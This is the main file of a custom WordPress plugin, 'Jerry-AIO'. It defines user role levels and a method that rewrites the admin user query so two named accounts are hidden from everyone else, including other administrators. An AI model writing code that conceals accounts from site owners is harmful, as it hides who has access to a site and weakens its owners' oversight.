<?php

/**
 * Plugin Name
 *
 * @package           Jerry-AIO
 * @author            Jerry Liu
 * @copyright         2021 YC-TECH
 *
 * @wordpress-plugin
 * Plugin Name:       Jerry-AIO
 * Plugin URI:
 * Description:       EZ update all the site
 * Version:           1.0.0
 * Requires at least: 5.5.0
 * Requires PHP:      7.3
 * Author:            Jerry Liu
 * Author URI:
 * Text Domain:       Jerry_AIO
 */


/**
 *
 *
 *
 */


defined('ABSPATH') or die('hey, you can\'t see this.');




if (!class_exists('Jerry_AIO')) {
    class Jerry_AIO
    {
        static $dev_mode = false;
        static $level_0 = ['administrator'];
        static $level_1 = ['designer'];
        static $level_2 = ['shop_manager_super']; //可以新增用戶
        static $level_3 = ['shop_manager', 'editor', 'author', 'translator']; //不可以新增
        static $hide_user = ['JerryLiu', 'KarenShen'];

        public function __construct()
        {
            //add_action('admin_head', [ $this, 'test' ]);
        }

        public function test()
        {
        }

        public function jaio_get_current_user_level()
        {
            /*
             * 限制載入CSS跟JS的角色 Admin除外
             */
            $user = wp_get_current_user();
            $user_levels[0] = self::$level_0;
            $user_levels[1] = self::$level_1;
            $user_levels[2] = self::$level_2;
            $user_levels[3] = self::$level_3;
            foreach ($user_levels as $key => $user_level) {
                if (array_intersect($user_level, $user->roles)) {
                    return $key;
                }
            }
        }

        public function jaio_hide_user($user_search)
        {
            global $current_user;
            $username = $current_user->user_login;
            $hide_users = self::$hide_user;

            if (!in_array($username, $hide_users)) {
                global $wpdb;
                $text = 'WHERE 1=1 ';
                foreach ($hide_users as $key => $hide_user) {
                    $text .= "AND {$wpdb->users}.user_login != '$hide_user' ";
                }
                $user_search->query_where = str_replace('WHERE 1=1', $text, $user_search->query_where);
            }
        }

        function activate()
        {
            flush_rewrite_rules();
        }
        function deactivate()
        {
            flush_rewrite_rules();
        }
    }
}

if (class_exists('Jerry_AIO')) {
    $Jerry_AIO = new Jerry_AIO();
}

require_once(__DIR__ . '/include/admin/class-admin.php');
require_once(__DIR__ . '/include/sync/sync.php');
require_once(__DIR__ . '/include/shortcode/shortcode.php');

new Custom_Admin();

/**
 * Activate the plugin.
 */
register_activation_hook(__FILE__, array($Jerry_AIO, 'activate'));

/**
 * Deactivation hook.
 */
register_deactivation_hook(__FILE__, array($Jerry_AIO, 'deactivate'));
